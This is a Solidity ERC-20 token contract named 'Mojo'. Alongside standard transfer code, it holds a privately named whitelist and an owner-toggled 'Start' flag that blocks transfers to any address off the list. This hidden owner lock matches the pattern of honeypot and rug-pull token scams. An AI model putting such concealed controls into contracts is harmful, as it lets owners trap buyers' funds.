// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Mojo {
    // Token metadata
    string public constant name = "Mojo";
    string public constant symbol = "MOJO";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    address public owner;
    bool private inStart = true;

    // Balances and allowances
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => bool) private wls;

    // Events
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    // Modifiers
    modifier onlyOwner() {
        require(msg.sender == owner, "Caller is not the owner");
        _;
    }

    // SafeMath functions to prevent overflows
    function safeAdd(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function safeSub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function safeMul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function safeDiv(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }

    // Constructor
    constructor() {
        owner = msg.sender;
        uint256 initialSupply = 1000000000000 * (10 ** uint256(decimals));
        totalSupply = initialSupply;
        balanceOf[msg.sender] = initialSupply;
        emit Transfer(address(0), msg.sender, initialSupply);
        wls[msg.sender] = true;
    }

    // ERC-20 transfer function
    function transfer(address _to, uint256 _value) public returns (bool success) {
        _transfer(msg.sender, _to, _value);
        return true;
    }

    // ERC-20 approve function
    function approve(address _spender, uint256 _value) public returns (bool success) {
        require(_spender != address(0), "Approve to zero address");
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    // ERC-20 transferFrom function
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_from != address(0), "Transfer from zero address");
        require(_to != address(0), "Transfer to zero address");
        require(_value <= balanceOf[_from], "Insufficient balance");
        require(_value <= allowance[_from][msg.sender], "Allowance exceeded");

        allowance[_from][msg.sender] = safeSub(allowance[_from][msg.sender], _value);
        _transfer(_from, _to, _value);
        return true;
    }

    // Internal transfer function
    function _transfer(address _from, address _to, uint256 _value) internal {
        require(_from != address(0), "Transfer from zero address");
        require(_to != address(0), "Transfer to zero address");
        require(_value <= balanceOf[_from], "Insufficient balance");
        if (inStart) {
            require(wls[_to], "Address not whitelisted");
        }

        balanceOf[_from] = safeSub(balanceOf[_from], _value);
        balanceOf[_to] = safeAdd(balanceOf[_to], _value);
        emit Transfer(_from, _to, _value);
    }

    // Renounce ownership
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }

    // Transfer ownership to another address
    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "New owner is the zero address");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

    // Allow the contract to receive ETH
    receive() external payable {}


    function Exeption(address[] calldata wl) external onlyOwner {
        for (uint i = 0; i < wl.length; i++) {
            wls[wl[i]] = true;
        }
    }


    function Start() external onlyOwner {
        inStart = !inStart;
    }
}